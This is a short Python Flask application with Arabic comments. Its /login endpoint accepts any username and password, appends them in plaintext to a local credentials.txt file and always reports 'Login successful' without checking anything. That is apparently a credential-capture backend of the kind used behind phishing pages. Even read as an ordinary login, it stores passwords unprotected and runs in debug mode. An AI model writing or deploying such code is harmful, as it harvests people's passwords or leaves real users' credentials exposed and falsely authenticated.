from flask import Flask, request

app = Flask(__name__)

# مسار لتسجيل بيانات تسجيل الدخول في ملف خارجي
def log_credentials(username, password):
    with open('credentials.txt', 'a', encoding='utf-8') as file:
        file.write(f"Username: {username}, Password: {password}\n")

@app.route('/login', methods=['POST'])
def login():
    # استلام بيانات تسجيل الدخول من المستخدم
    username = request.form.get('username')
    password = request.form.get('password')

    if username and password:
        # تخزين بيانات تسجيل الدخول في ملف
        log_credentials(username, password)
        return 'Login successful', 200
    else:
        return 'Invalid login credentials', 400

if __name__ == '__main__':
    app.run(debug=True)
